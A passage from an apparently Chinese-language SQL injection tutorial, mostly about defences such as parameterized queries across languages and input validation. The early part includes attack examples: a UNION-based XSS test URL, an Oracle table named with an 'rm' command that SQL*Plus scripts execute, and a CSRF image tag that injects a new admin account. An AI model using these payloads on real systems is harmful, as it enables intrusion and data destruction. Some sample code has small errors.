title="攻击客户端数据库"></a>攻击客户端数据库</h4><p>要发送客户端SQL注入攻击，攻击者必须识别出一些他能控制的数据片段，并且应用程序以非安全方式将这些数据片段存储在其他用户的客户端数据库中。</p><p>如果这些客户端数据库存在同步，能到达其他数据库执行，则可以注入SQL查询</p><p>场景</p><p>在社交网络应用程序中，在Web邮件应用程序中，在实现拍卖功能的应用程序中，攻击者可以控制的基于文本的数据，在屏幕上输入的但是受到输入验证程序支配的数据</p><h3 id="使用混合攻击"><a href="#使用混合攻击" class="headerlink" title="使用混合攻击"></a>使用混合攻击</h3><p>利用多种漏洞混合攻击</p><h4 id="利用捕获的数据"><a href="#利用捕获的数据" class="headerlink" title="利用捕获的数据"></a>利用捕获的数据</h4><p>利用SQL注入读取权限，账户，口令</p><h4 id="创建跨站脚本"><a href="#创建跨站脚本" class="headerlink" title="创建跨站脚本"></a>创建跨站脚本</h4><p>在SQL注入不能回显时，可以注入反射XSS来返回输出</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">https:<span class="token comment">//www.example.org/MyOrders.php?orderType=123+UNION+SELECT+1,'&lt;script&gt;alert(1)&lt;/script&gt;',1</span><span class="token comment">#测试xss,如果没有过滤就会执行成功</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="在Oracle上运行操作系统命令"><a href="#在Oracle上运行操作系统命令" class="headerlink" title="在Oracle上运行操作系统命令"></a>在Oracle上运行操作系统命令</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token string">"!rm Rf/"</span> <span class="token punctuation">(</span>a varchar2 <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#该命令能被Oracle接受</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果DBA或开发人员使用带spool命令（DBA编写动态SQL脚本时经常使用的技术）的 SQL*Plus脚本，那么SQL*Plus会清除上述例子中的双引号以便访问该对象。接下来SQL*Plus 会将感叹号解析成主机命令（UNIX中是！，Windows和VMS中是$），并将感叹号后面的内容作为操作系统命令执行。</p><p>下面是一个易受攻击的SQL*Plus脚本的例子。它创建了一个名为test.sql的spool文件， 之后执行该文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">SPOOL test.sqlSELECT table_name FROM all_tables WHERE <span class="token assign-left variable">owner</span><span class="token operator">=</span><span class="token string">'SCOTT'</span><span class="token punctuation">;</span>SPOOL OFF@test.sql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="利用验证过的漏洞"><a href="#利用验证过的漏洞" class="headerlink" title="利用验证过的漏洞"></a>利用验证过的漏洞</h4><p>如果管理员在应用程序中完全可信，那么他们将能够直接在数据库中执行任意SQL查询。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">https:<span class="token comment">//www.example.org/admin/ViewUser.aspx?UID=123</span><span class="token comment">#若UID是管理员,就可以直接利用管理员权限攻击</span><span class="token comment">#构造跨站伪造,诱导管理员帮助我们执行命令</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">" https://www.example.org/admin/ViewUser.aspx?UID=123;+INSERT+INTO+USERS+(username,password,isAdmin)+VALUES+('pablo','quest45th', true)"</span><span class="token operator">&gt;</span><span class="token comment">#若管理员点击图片就会帮我们创建一个新的管理员用户,这个用户我们能掌握。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="代码层防御"><a href="#代码层防御" class="headerlink" title="代码层防御"></a>代码层防御</h2><h3 id="领域驱动的安全"><a href="#领域驱动的安全" class="headerlink" title="领域驱动的安全"></a>领域驱动的安全</h3><p>领域驱动的安全(Domain Driven Security, DDS)是一种设计代码的方法，以这种方法设计的代码可以避免典型的注入问题</p><p>领域驱动的安全是一种开发方法，它的目标是帮助开发人员进行推理并缓解任何类型的注入攻击的威胁——包括SQL注入和跨站脚本攻击。领域驱动的安全是开发人员为开发人员创建的理念，它的灵感来自于Eric Evans提出的领域驱动设计，它试图充分利用来自于DDD的概念以提高应用程序的安全性。</p><p>简单来说，就是把所有过滤、处理的过程封装成一个类，将这个处理类放在输出到服务器之间，自动过滤</p><p>当然，过滤不能完全处理，使用参数化语言也是明智选择，有时编码也能解决问题，但是考虑到不同数据库的处理不同，也会衍生相应问题</p><h3 id="使用参数化语言"><a href="#使用参数化语言" class="headerlink" title="使用参数化语言"></a>使用参数化语言</h3><p>大多数现代编程语言和数据库访问API可以使用占位符或绑定变量来向SQL查询提供参数(而非直接对用户输入进行操作)。通常称之为参数化语句</p><p>虽然它们不会修改传递给数据库的内容，但如果正在调用的数据库功能在存储过程或函数的实现中使用了动态SQL，那么仍然可能出现SQL注入。Microsoft SQL Server和Oracle长期受该问题的困扰，因为它们之前附带安装了很多内置的易受SQL注入攻击的存储过程。</p><p>二次注入也可能实现</p><p>并不是所有的SQL语句都可以参数化。特别是只能参数化数据值，而不能参数化SQL标识符或关键字。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Username <span class="token operator">=</span> request<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span>Password <span class="token operator">=</span> request <span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token keyword">Sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE username='"</span> <span class="token operator">+</span> Username <span class="token operator">+</span> <span class="token string">"'AND password='"</span><span class="token operator">+</span>Password <span class="token operator">+</span> <span class="token string">"'"</span>Result <span class="token operator">=</span> Db<span class="token punctuation">.</span><span class="token keyword">Execute</span><span class="token punctuation">(</span><span class="token keyword">Sql</span><span class="token punctuation">)</span><span class="token keyword">If</span> <span class="token punctuation">(</span>Result<span class="token punctuation">)</span> <span class="token comment">/* successful login */</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是一段易受攻击代码，下面将会对它参数化</p><h4 id="Java中的参数化语句"><a href="#Java中的参数化语句" class="headerlink" title="Java中的参数化语句"></a>Java中的参数化语句</h4><p>Java提供了JDBC框架(在java.sql和javax.sql命名空间中实现)，作为独立于供应商的数据库访问方法。JDBC支持多种多样的数据库访问方法，包括通过PreparedStatement类来使用参数化语句。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Connection</span> con <span class="token operator">=</span> <span class="token class-name">DriverManager</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span>connectionstring<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE username=? AND password=?"</span><span class="token punctuation">;</span> <span class="token class-name">PreparedStatement</span> lookupusers <span class="token operator">=</span> con<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将参数添加到SQL查询中</span>lookupUser<span class="token punctuation">.</span>setstring <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//在位置1添加字符串</span>lookupUser<span class="token punctuation">.</span>setstring <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//在位置2添加字符串</span>rs <span class="token operator">=</span> lookupUser<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//添加参数时（通过使用不同的ser&lt;type&gt;函数，比如setString）指定了问号(?)占位符的编号位置（从1开始）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在J2EE应用中，除了使用Java提供的JDBC框架外，通常还可以使用附加的包来高效地访问数据库。常用的访问数据库的持久化框架为Hibernate。</p><p>除了可以使用固有的SQL功能和前面介绍的JDBC功能外，Hibernate还提供了自己的功能来将变量绑定到参数化语句。Query对象提供了使用命名参数(使用冒号指定，parameter) 或JDBC风格的问号占位符(?)的方法。</p><p>下面的例子展示了如何使用带命名参数的Hibernate：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">string sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE username=:username AND"</span> <span class="token operator">+</span> <span class="token string">"password=:password"</span><span class="token punctuation">;</span><span class="token class-name">Query</span> lookupUser <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">createQuery</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将参数添加到SQL查询中</span>lookupUsers<span class="token punctuation">.</span><span class="token function">setstring</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 添加 username</span>lookupUsers<span class="token punctuation">.</span><span class="token function">setstring</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//添加 password</span><span class="token class-name">List</span> rs <span class="token operator">=</span> lookupUser<span class="token punctuation">.</span><span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来的例子展示了如何在Hibernate的参数中，使用JDBC风格的问号占位符。请注意， Hibernate从0开始而不是像JDBC那样从1开始对参数进行编号。因此，列表中的第一个参数为0，第二个为1</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">string sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE username=? AND password=?"</span><span class="token punctuation">;</span><span class="token class-name">Query</span> lookupUser <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">createQuery</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将参数添加到SQL查询中</span>lookupUser<span class="token punctuation">.</span><span class="token function">setstring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//添加username</span>lookupUser<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//添加password</span><span class="token class-name">List</span> rs <span class="token operator">=</span> lookupUser<span class="token punctuation">.</span><span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="NET-C-中的参数化语句"><a href="#NET-C-中的参数化语句" class="headerlink" title=".NET(C#)中的参数化语句"></a>.NET(C#)中的参数化语句</h4><p>Microsoft .NET提供了很多不同的访问方式，它们使用ADO.NET框架来参数化语句。ADO.NET还提供了附加的功能，可以进一步检查提供的参数，比如对提交的数据执行类型检查等。</p><p>根据访问的数据库类型的不同，ADO.NET提供了4种不同的数据提供程序:用于Microsoft SQL Server 的 System.Data.SqlClient，用于 Oracle 数据库的 System.Data.OracleClient,以及分别用 于OLE DB和ODBC数据源的System.Data.OleDb和System.Data.Odbc</p><p>ADO.NET数据提供程序以及参数命名语法</p><table><thead><tr><th>数据提供程序</th><th>参数语法</th></tr></thead><tbody><tr><td>System.Data.SqlClient</td><td>@parameter</td></tr><tr><td>System.Data.OracleClient</td><td>:parameter(只能位于参数化的SQL命令文本中)</td></tr><tr><td>System.Data.OleDb</td><td>带问号占位符(?)的位置参数</td></tr><tr><td>System.Data.Odbc</td><td>带问号占位符(?)的位置参数</td></tr></tbody></table><p>使用SqlClient数据提供程序将其重写为.NET格式的参数化语句</p><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">SqlConnection con = new SqlConnection(Connectionstring);string Sql = "SELECT * FROM users WHERE username=@username" + "AND password=@password";cmd = new SqlCommand(Sql, con); //将参数添加到SQL查询中cmd.Parameters.Add("@username",//参数名                   SqlDbType.NVarChar,//数据类型                   16);//长度cmd.Parameters.Add("@password",                   SqlDbType.NVarChar,                   16);cmd.Parameters.Value["@username"]=username;//设置参数cmd.Parameters.Value["@password"]=password;//提供参数值reader = cmd.ExecuteReader();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用OracleClient数据提供程序重写的同一.NET格式的参数化语句。 在命令文本（SQL字符串）中的参数前面添加了冒号，而不是在代码的其他位置</p><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">SqlConnection con = new SqlConnection(Connectionstring);string Sql = "SELECT * FROM users WHERE username=:username" + "AND password=:password";cmd = new SqlCommand(Sql, con); //将参数添加到SQL查询中cmd.Parameters.Add("username",//参数名                   SqlDbType.NVarChar,//数据类型                   16);//长度cmd.Parameters.Add("password",                   SqlDbType.NVarChar,                   16);cmd.Parameters.Value["username"]=username;//设置参数cmd.Parameters.Value["password"]=password;//提供参数值reader = cmd.ExecuteReader();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用OleDbClient数据提供程序重写的同一.NET格式的参数化语句。 使用OleDbClient或OleDb数据提供程序时，必须按照正确的问号占位符顺序来添加参数</p><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">SqlConnection con = new SqlConnection(Connectionstring);string Sql = "SELECT * FROM users WHERE username=? + "AND password=?";cmd = new SqlCommand(Sql, con); //将参数添加到SQL查询中cmd.Parameters.Add("@username",//参数名                   SqlDbType.NVarChar,//数据类型                   16);//长度cmd.Parameters.Add("@password",                   SqlDbType.NVarChar,                   16);cmd.Parameters.Value["@username"]=username;//设置参数cmd.Parameters.Value["@password"]=password;//提供参数值reader = cmd.ExecuteReader();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="PHP中的参数化语句"><a href="#PHP中的参数化语句" class="headerlink" title="PHP中的参数化语句"></a>PHP中的参数化语句</h4><p>PHP同样包含很多用于访问数据库的框架。本节介绍三种最常见的框架：访问MySQL数据库的mysqli包，PEAR::MDB2包（它替代了流行的PEAR::DB包）以及新的PHP数据对象（PHP Data Object, PDO)框架，它们均为使用参数化语句提供了便利。</p><p>mysqli包适用于PHP 5.x，可以访问MySQL 4.1及之后的版本。通过使用问号占位符来支持参数化语句。下面的例子展示了一条使用mysqli包的参数化语句</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$con</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"username"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"password"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"db"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username=? AND password=?"</span><span class="token punctuation">;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$con</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将参数添加到SQL查询中</span><span class="token variable">$cmd</span><span class="token operator">-&gt;</span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ss"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token comment">//将参数作为字符串绑定</span><span class="token variable">$cmd</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当在PHP中使用PostgreSQL数据库时，PHP 5.1.0引入了一个简单的方法以便使用参数化的查询语句。该方法名为pg_query_params(),它允许开发人员在同一行代码内提供SQL查询 和参数</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">pg_query_params</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE username=<span class="token interpolation"><span class="token variable">$1</span></span> AND password=<span class="token interpolation"><span class="token variable">$2</span></span>"</span><span class="token punctuation">,</span> <span class="token keyword">Array</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>PEAR::MDB2包是一种被广泛使用且独立于供应商的数据库访问框架，MDB2支持使用冒号字符的命名参数和问号占位符两种方式来定义参数。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$mdb2</span> <span class="token operator">=</span> <span class="token operator">&amp;</span> <span class="token class-name static-context">MDB2</span><span class="token operator">::</span><span class="token function">factory</span><span class="token punctuation">(</span><span class="token variable">$dsn</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username=? AND password=?"</span><span class="token punctuation">;</span><span class="token variable">$types</span> <span class="token operator">=</span> <span class="token keyword">array</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'text'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'text'</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token comment">//设置数据类型</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$mdb2</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span><span class="token variable">$types</span><span class="token punctuation">,</span><span class="token constant">MDS2_PREPARE_MANIP</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token keyword">array</span> <span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//要传递的参数</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$cmd</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PDO包含在PHP 5.1及之后的版本中。它是一个面向对象且独立于供应商的数据层，用于访问数据库。PDO既支持使用冒号字符的命名参数，也支持使用问号占位符定义的参数</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM uses WHERE username=:username AND"</span><span class="token operator">+</span><span class="token string double-quoted-string">"password=:password"</span><span class="token punctuation">;</span><span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$dbh</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//绑定值和数据类型</span><span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">bindParam</span><span class="token punctuation">(</span><span class="token string single-quoted-string">':username'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_STR</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">bindParam</span><span class="token punctuation">(</span><span class="token string single-quoted-string">':passeord'</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_STR</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="PL-SQL中的参数化语句"><a href="#PL-SQL中的参数化语句" class="headerlink" title="PL/SQL中的参数化语句"></a>PL/SQL中的参数化语句</h4><p>Oracle PL/SQL同样支持在数据库层代码中使用参数化查询。PL/SQL支持使用带编号的冒号字符(例如:1)来绑定参数。使用带绑定参数的PL/SQL在匿名的 PL/SQL块中构造参数化语句：</p><pre class="line-numbers language-plsql" data-language="plsql"><code class="language-plsql"><span class="token keyword">DECLARE</span> username varchar2<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>password varchar2<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">result</span> integer<span class="token punctuation">;</span><span class="token keyword">BEGIN</span> <span class="token keyword">Execute</span> <span class="token keyword">immediate</span> <span class="token operator">*</span> <span class="token keyword">SELECT</span> <span class="token function">count</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> users <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token operator">:</span><span class="token number">1</span> <span class="token keyword">and</span> password<span class="token operator">=</span><span class="token operator">:</span><span class="token number">2</span>' <span class="token keyword">into</span> <span class="token keyword">result</span> <span class="token keyword">using</span> username<span class="token punctuation">,</span> password<span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="移动应用中的参数化语句"><a href="#移动应用中的参数化语句" class="headerlink" title="移动应用中的参数化语句"></a>移动应用中的参数化语句</h3><p>基于iOS和Android的设备都具有内建于设备(in-device)的数据库支持，并提供了创建、更新和查询这些数据库的API。</p><h4 id="iOS应用程序中的参数化语句"><a href="#iOS应用程序中的参数化语句" class="headerlink" title="iOS应用程序中的参数化语句"></a>iOS应用程序中的参数化语句</h4><p>对于iOS系统，用于开发应用的API通过SQLite库libsqlite3.dylib支持SQLite。如果直接使用SQLite(而不是通过Apple框架Core Data),那么最流行的框架是FMDB。使用FMDB框架时，可以使用executeUpdate()方法构建参数化的insert语句：</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">[db executeUpdate:@"INSERT INTO artists (name) VALUES (?)",@"Sinead O'Connor"];<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>与之类似，如果想查询数据库，可以使用executeQuery()方法：</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">FMResultSet *rs = [db executeQuery:@"SELECT * FROM songs WHERE artist=?",@"Sinead O'Connor"];<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Android应用程序中的参数化语句"><a href="#Android应用程序中的参数化语句" class="headerlink" title="Android应用程序中的参数化语句"></a>Android应用程序中的参数化语句</h4><p>Android设备也包含了用于访问SQLite数据库子系统的AM。该API支持参数化语句，开发人员可以分别提供查询和数据。</p><p>对于insert语句，可以使用SQLiteStatement类：</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">statement = db.compileStatement("INSERT INTO artists (name) VALUES (?)");statement.bind(1, "Sinead O'Connor");statement.executeInsert();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>当查询数据库时，只须在SQLite-Database对象上直接使用query()</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">db.query("songs",new String[ ] { "title" } /* columns to return */, "artist = ?" /* where clause */,new String [ ] { "Sinead O'Connor" } /* parameters to bind */,null /* group by */,null /* having */,null /* order by */);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="HTML5浏览器存储中的参数化语句"><a href="#HTML5浏览器存储中的参数化语句" class="headerlink" title="HTML5浏览器存储中的参数化语句"></a>HTML5浏览器存储中的参数化语句</h4><p>在HTML5标准中可以使用两种类型的存储——Web SQL Database规范和Web Storage规范。该规范中包含了一个简单的方法用于创建参数化查询，即使用executeSql())方法</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">t<span class="token punctuation">.</span>executeSql<span class="token punctuation">(</span><span class="token string">'SELECT * FROM songs WHERE artist=? AND song=?'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>artist<span class="token punctuation">,</span> songName<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> <span class="token keyword">data</span><span class="token punctuation">)</span> {<span class="token comment">//对数据执行某些操作</span>}<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在上面的代码中，t代表事务(transaction), SQL语句将在该事务中执行。在SQL语句中使用问号作为占位符，并提供了一个参数数组，该数组中元素的顺序就是这些参数应用于SQL 语句的顺序。最后一个参数是回调函数，用于处理从数据库返回的数据。</p><p>Web Storage规范则使用setltem()、getltem()和removeltem()等方法，提供了一种简单的键/值对的存储方式。在该规范中并没有通过字符串连接来构建语句的查询语言，因此类似于SQL 注入这样的攻击对Web Storage无效。</p><h3 id="输入验证"><a href="#输入验证" class="headerlink" title="输入验证"></a>输入验证</h3><p>输入验证是指测试应用程序接收到的输入，以保证其符合应用程序中标准定义的过程。它可以简单到将参数限制成某种类型，也可以复杂到使用正则表达式或业务逻辑来验证输入。</p><p>白名单验证(有时称为包含验证或正验证)和黑名单验证(有时称 为排除验证或负验证)。</p><h4 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h4><p>白名单验证是只接收已记录在案的良好输入的操作。</p><p>要点:</p><p>输入的数据是否在白名单规则内</p><p>数据类型是否满足</p><p>数据大小是否正确</p><p>数据范围</p><p>数据内容</p><p>实现内容验证的常用方法是使用正则表达式。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#验证字符串中是否包含美国邮政编码：</span>^<span class="token punctuation">\</span>d<span class="token punctuation">{</span><span class="token number">5</span><span class="token punctuation">}</span><span class="token punctuation">(</span>-<span class="token punctuation">\</span>d<span class="token punctuation">{</span><span class="token number">4</span><span class="token punctuation">}</span><span class="token punctuation">)</span>?$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>该正则表达式按下列规则匹配5位和5位加4位的邮政编码：</p><p>^\d{5}：准确匹配字符串开头的5位数字</p><p>(-\d{4})?：准确匹配可能存在（出现）或完全不存在（未出现）的破折号字符加4位数字。</p><p>$:出现在字符串末尾。如果字符串末尾包含附加的内容，正则表达式将不匹配。</p><p>设计输入验证和处理策略</p><ul><li><p>在应用程序输入层使用白名单输入验证以便验证所有用户输入都符合应用要接 收的内容。应用只允许接收符合期望格式的输入。</p></li><li><p>在客户端浏览器上同样执行白名单输入验证，这样可以防止为用户输入不可接 收的数据时服务器和浏览器间的往返传递。不能将该操作作为安全控制手段，因为攻击者可以修改来自用户浏览器的所有数据。</p></li><li><p>在Web应用防火墙（WAF）层使用黑名单和白名单输入验证（以漏洞“签名”和“有 经验”行为的形式）以便提供入侵检测/阻止功能和监视应用攻击。</p></li><li><p>在应用程序中自始自终地使用参数化语句以保证执行安全的SQL执行。</p></li><li><p>在数据库中使用编码技术以便在动态SQL中使用输入时安全地对其编码。</p></li><li><p>在使用从数据库中提取的数据之前恰当地对其进行编码。例如，将浏览器中显示的数据针对跨站脚本进行编码。</p></li></ul><h5 id="用已知值进行检验"><a href="#用已知值进行检验" class="headerlink" title="用已知值进行检验"></a>用已知值进行检验</h5><p>将输入值与一个有效值的列表进行比较，如果输入值不在列表中，就拒绝该输入，这是一种强大但常常未被充分利用的检验输入值的方法。通过将值与一个列表进行比较，可以完全控制可能的输入值以及输入可能通过的代码路径。</p><p>间接输入(input indirection)是另一种用已知值进行检验的方法。在这种方法中，服务器端并不接收直接来自客户端的值，客户端呈现一个允许值的列表，并向服务器端提交选中值的索引。</p><h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><p>黑名单验证是只拒绝己记录在案的不良输入的操作，它通过浏览输入的内容来查找是否存在己知的不良字符、字符串或模式。</p><p>在使用黑名单的同时结合使用输出编码以保证对传递到其他位置（比如，传递给数据库）的输入进行附加检查，从而保证能正确地处理该输入以防止SQL注入。</p><h4 id="Java中的输入验证"><a href="#Java中的输入验证" class="headerlink" title="Java中的输入验证"></a>Java中的输入验证</h4><p>Java中的输入验证支持专属于正在使用的框架。</p><p>定义一个输入验证类，该类实现了<code>javax.faces.validator.Validator</code>接口</p><p>请参考下列代码片段并将其作为验证JSF(Java Server Faces, JSF)中用户名的例子</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UsernameValidator</span> <span 